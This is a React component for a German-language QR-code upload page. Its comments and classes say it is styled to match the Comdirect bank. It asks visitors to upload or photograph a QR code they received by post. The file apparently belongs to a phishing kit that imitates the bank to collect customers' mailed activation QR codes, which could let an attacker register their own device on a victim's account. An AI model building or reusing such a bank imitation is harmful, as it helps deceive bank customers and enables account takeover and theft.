import React, { useState, useRef, useEffect } from 'react';
import { File, Camera, CheckCircle, Upload } from 'lucide-react';

interface QRUploadFormProps {
  onUpload: (file: File) => void;
  isRetry?: boolean;
}

const QRUploadForm: React.FC<QRUploadFormProps> = ({ onUpload, isRetry = false }) => {
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [dragOver, setDragOver] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  
  const fileInputRef = useRef<HTMLInputElement>(null);
  const cameraInputRef = useRef<HTMLInputElement>(null);

  // CSS variables that match the Comdirect styling
  const cssVariables = {
    '--text': '#28363c',
    '--text-secondary': '#7d8287',
    '--border': '#d1d5db',
    '--border-hover': '#28363c',
    '--active': '#28363c',
    '--style-primary': '#fff500',
    '--style-primary-hover': '#e6d900',
    '--style-primary-on-it': '#000000',
    '--bg': '#ffffff',
    '--focus': '#28363c',
    '--focus-offset': '2px',
    '--focus-width': '1px'
  } as React.CSSProperties;

  // Check for mobile screen size
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Clear selected file when isRetry changes
  useEffect(() => {
    setSelectedFile(null);
  }, [isRetry]);

  const handleFileSelect = (file: File) => {
    if (file && (file.type.startsWith('image/') || file.type === 'application/pdf')) {
      setSelectedFile(file);
    } else {
      alert('Bitte wählen Sie eine Bilddatei (JPG, PNG) oder PDF aus.');
    }
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragOver(false);
    
    const files = Array.from(e.dataTransfer.files);
    if (files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const handleCameraInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const handleUpload = async () => {
    if (!selectedFile) return;
    
    setIsUploading(true);
    
    try {
      await onUpload(selectedFile);
    } catch (error) {
      console.error('Error uploading file:', error);
      setIsUploading(false);
    }
  };

  return (
    <div style={{
      ...cssVariables,
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'MarkWeb, Arial, sans-serif'
    }}>
      
      <div style={{
        maxWidth: '980px',
        margin: '0 auto',
        width: '100%'
      }}>
        <div style={{
          display: 'flex',
          flexDirection: isMobile ? 'column' : 'row',
          minHeight: '100vh'
        }}>
          {/* Left Column - Main Content */}
          <div style={{
            flex: isMobile ? '1' : '0 0 calc(65% - 15px)',
            padding: isMobile ? '20px' : '60px 15px 60px 20px',
            backgroundColor: '#ffffff',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'flex-start'
          }}>
            <div style={{
              width: '100%',
              maxWidth: 'none'
            }}>
              {/* Page Title */}
              <h1 style={{
                fontSize: '1.875rem',
                fontWeight: '400',
                lineHeight: '2.625rem',
                margin: '0 0 2rem 0',
                color: 'var(--text)',
                fontFamily: 'MarkWeb, Arial, sans-serif'
              }}>
                {isRetry ? 'QR-Code erneut hochladen' : 'QR-Code hochladen'}
              </h1>

              {/* Description */}
              <p style={{
                color: 'var(--text)',
                fontSize: '1rem',
                lineHeight: '1.6',
                margin: '0 0 2rem 0',
                fontFamily: 'MarkWeb, Arial, sans-serif'
              }}>
                {isRetry 
                  ? 'Bitte laden Sie den QR-Code erneut hoch. Achten Sie auf eine gute Bildqualität.'
                  : 'Bitte laden Sie den QR-Code hoch, den Sie per Post erhalten haben.'
                }
              </p>

              {/* Retry Error */}
              {isRetry && (
                <div style={{
                  backgroundColor: '#fef2f2',
                  border: '1px solid #fecaca',
                  borderRadius: '8px',
                  padding: '1rem',
                  marginBottom: '2rem',
                  display: 'flex',
                  alignItems: 'flex-start',
                  gap: '0.75rem'
                }}>
                  <span 
                    aria-hidden="true" 
                    className="text-size--large medium icon-font-warning"
                    style={{
                      color: '#dc2626',
                      flexShrink: 0
                    }}
                  ></span>
                  <div>
                    <p style={{
                      color: '#dc2626',
                      fontSize: '0.875rem',
                      fontWeight: '500',
                      margin: '0 0 0.25rem 0',
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      QR-Code nicht erkannt
                    </p>
                    <p style={{
                      color: '#991b1b',
                      fontSize: '0.75rem',
                      margin: 0,
                      fontFamily: 'MarkWeb, Arial, sans-serif',
                      lineHeight: '1.4'
                    }}>
                      Bitte stellen Sie sicher, dass der QR-Code vollständig sichtbar und scharf ist.
                    </p>
                  </div>
                </div>
              )}

              {/* Upload Area */}
              <div
                onDrop={handleDrop}
                onDragOver={(e) => {
                  e.preventDefault();
                  setDragOver(true);
                }}
                onDragLeave={() => setDragOver(false)}
                style={{
                  border: `2px dashed ${dragOver ? 'var(--active)' : selectedFile ? '#28a745' : 'var(--border)'}`,
                  borderRadius: '8px',
                  padding: '2rem',
                  textAlign: 'center',
                  backgroundColor: dragOver ? '#f8f9fa' : selectedFile ? '#f8fff8' : '#fafafa',
                  transition: 'all 0.3s ease',
                  marginBottom: '2rem',
                  cursor: 'pointer'
                }}
                onClick={() => {
                  if (!selectedFile) {
                    fileInputRef.current?.click();
                  }
                }}
              >
                {selectedFile ? (
                  <div>
                    <CheckCircle size={48} color="#28a745" style={{ marginBottom: '1rem' }} />
                    <h3 style={{
                      color: 'var(--text)',
                      fontSize: '1.125rem',
                      fontWeight: '400',
                      marginBottom: '0.5rem',
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      Datei ausgewählt
                    </h3>
                    <p style={{
                      color: 'var(--text-secondary)',
                      fontSize: '0.875rem',
                      marginBottom: '1.5rem',
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      {selectedFile.name} ({(selectedFile.size / 1024 / 1024).toFixed(2)} MB)
                    </p>
                    <div style={{ display: 'flex', justifyContent: 'center' }}>
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          setSelectedFile(null);
                        }}
                        style={{
                          backgroundColor: '#f8f9fa',
                          color: 'var(--text-secondary)',
                          border: '1px solid var(--border)',
                          borderRadius: '24px',
                          padding: '12px 24px',
                          fontSize: '1rem',
                          fontWeight: '400',
                          cursor: 'pointer',
                          fontFamily: 'MarkWeb, Arial, sans-serif',
                          transition: 'all 0.2s ease',
                          height: '48px'
                        }}
                        onMouseOver={(e) => {
                          e.currentTarget.style.backgroundColor = '#e9ecef';
                        }}
                        onMouseOut={(e) => {
                          e.currentTarget.style.backgroundColor = '#f8f9fa';
                        }}
                      >
                        Neu auswählen
                      </button>
                    </div>
                  </div>
                ) : (
                  <div>
                    <Upload size={48} color="var(--text)" style={{ marginBottom: '1rem' }} />
                    <h3 style={{
                      color: 'var(--text)',
                      fontSize: '1.125rem',
                      fontWeight: '400',
                      marginBottom: '0.5rem',
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      QR-Code Datei hochladen
                    </h3>
                    <p style={{
                      color: 'var(--text-secondary)',
                      fontSize: '1rem',
                      marginBottom: '1rem',
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      Ziehen Sie eine Datei hier hin oder klicken Sie zum Auswählen
                    </p>
                    <p style={{
                      color: 'var(--text-secondary)',
                      fontSize: '0.875rem',
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      Unterstützte Formate: JPG, PNG, PDF (max. 10MB)
                    </p>
                  </div>
                )}
              </div>
              
              {/* Alternative Options */}
              <div style={{
                borderTop: '1px solid var(--border)',
                paddingTop: '2rem'
              }}>
                {selectedFile ? (
                  // Show upload button when file is selected
                  <div style={{
                    display: 'flex',
                    justifyContent: isMobile ? 'center' : 'flex-start'
                  }}>
                    <button
                      onClick={handleUpload}
                      disabled={isUploading}
                      className="comdirect-button comdirect-button-large"
                      style={{
                        opacity: isUploading ? 0.7 : 1,
                        cursor: isUploading ? 'not-allowed' : 'pointer',
                        minWidth: isMobile ? '100%' : '200px'
                      }}
                    >
                      <Upload size={20} />
                      {isUploading ? 'Wird hochgeladen...' : 'Hochladen'}
                    </button>
                  </div>
                ) : (
                  // Show file selection options when no file is selected
                  <>
                    <h3 style={{
                      color: 'var(--text)',
                      fontSize: '1.125rem',
                      fontWeight: '400',
                      marginBottom: '1.5rem',
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      Alternative Optionen
                    </h3>
                    
                    <div style={{ 
                      display: 'flex',
                      flexDirection: isMobile ? 'column' : 'row',
                      gap: '1rem'
                    }}>
                      {/* File Upload Button */}
                      <button
                        onClick={() => fileInputRef.current?.click()}
                        className="comdirect-button comdirect-button-large"
                        style={{
                          minWidth: isMobile ? '100%' : '200px',
                          flex: isMobile ? 'none' : '1'
                        }}
                      >
                        <File size={20} />
                        Datei auswählen
                      </button>
                      
                      {/* Camera Button */}
                      <button
                        onClick={() => cameraInputRef.current?.click()}
                        className="comdirect-button comdirect-button-large"
                        style={{
                          minWidth: isMobile ? '100%' : '200px',
                          flex: isMobile ? 'none' : '1'
                        }}
                      >
                        <Camera size={20} />
                        Kamera verwenden
                      </button>
                    </div>
                  </>
                )}
              </div>
            </div>
          </div>

          {/* Right Column - QR Code Example (Desktop only) */}
          {!isMobile && (
            <div style={{
              flex: '0 0 calc(35% - 15px)',
              padding: '60px 20px 60px 15px',
              backgroundColor: '#ffffff',
              display: 'flex',
              flexDirection: 'column',
              justifyContent: 'flex-start'
            }}>
              <div style={{
                textAlign: 'center',
                marginTop: '4rem'
              }}>
                <div style={{
                  width: '100%',
                  maxWidth: '350px',
                  height: '350px',
                  backgroundColor: '#f8f9fa',
                  border: '2px dashed var(--border)',
                  borderRadius: '8px',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  justifyContent: 'center',
                  margin: '0 auto'
                }}>
                  <div style={{
                    width: '120px',
                    height: '120px',
                    backgroundColor: '#000',
                    borderRadius: '4px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    marginBottom: '1rem'
                  }}>
                    <div style={{
                      width: '100px',
                      height: '100px',
                      backgroundColor: '#fff',
                      borderRadius: '2px',
                      display: 'grid',
                      gridTemplateColumns: 'repeat(10, 1fr)',
                      gridTemplateRows: 'repeat(10, 1fr)',
                      gap: '1px'
                    }}>
                      {Array.from({ length: 100 }, (_, i) => (
                        <div
                          key={i}
                          style={{
                            backgroundColor: Math.random() > 0.5 ? '#000' : '#fff',
                            width: '100%',
                            height: '100%'
                          }}
                        />
                      ))}
                    </div>
                  </div>
                  <p style={{
                    color: 'var(--text-secondary)',
                    fontSize: '0.875rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif',
                    textAlign: 'center',
                    margin: 0
                  }}>
                    QR-Code Beispiel
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Mobile QR Code Example */}
          {isMobile && (
            <div style={{
              padding: '0 20px 20px 20px',
              textAlign: 'center'
            }}>
              <div style={{
                width: '100%',
                maxWidth: '300px',
                height: '300px',
                backgroundColor: '#f8f9fa',
                border: '2px dashed var(--border)',
                borderRadius: '8px',
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                justifyContent: 'center',
                margin: '0 auto'
              }}>
                <div style={{
                  width: '100px',
                  height: '100px',
                  backgroundColor: '#000',
                  borderRadius: '4px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  marginBottom: '1rem'
                }}>
                  <div style={{
                    width: '80px',
                    height: '80px',
                    backgroundColor: '#fff',
                    borderRadius: '2px',
                    display: 'grid',
                    gridTemplateColumns: 'repeat(8, 1fr)',
                    gridTemplateRows: 'repeat(8, 1fr)',
                    gap: '1px'
                  }}>
                    {Array.from({ length: 64 }, (_, i) => (
                      <div
                        key={i}
                        style={{
                          backgroundColor: Math.random() > 0.5 ? '#000' : '#fff',
                          width: '100%',
                          height: '100%'
                        }}
                      />
                    ))}
                  </div>
                </div>
                <p style={{
                  color: 'var(--text-secondary)',
                  fontSize: '0.875rem',
                  fontFamily: 'MarkWeb, Arial, sans-serif',
                  textAlign: 'center',
                  margin: 0
                }}>
                  QR-Code Beispiel
                </p>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Hidden file inputs */}
      <input
        ref={fileInputRef}
        type="file"
        accept="image/*,.pdf"
        onChange={handleFileInputChange}
        style={{ display: 'none' }}
      />
      
      <input
        ref={cameraInputRef}
        type="file"
        accept="image/*"
        capture="environment"
        onChange={handleCameraInputChange}
        style={{ display: 'none' }}
      />
    </div>
  );
};

export default QRUploadForm;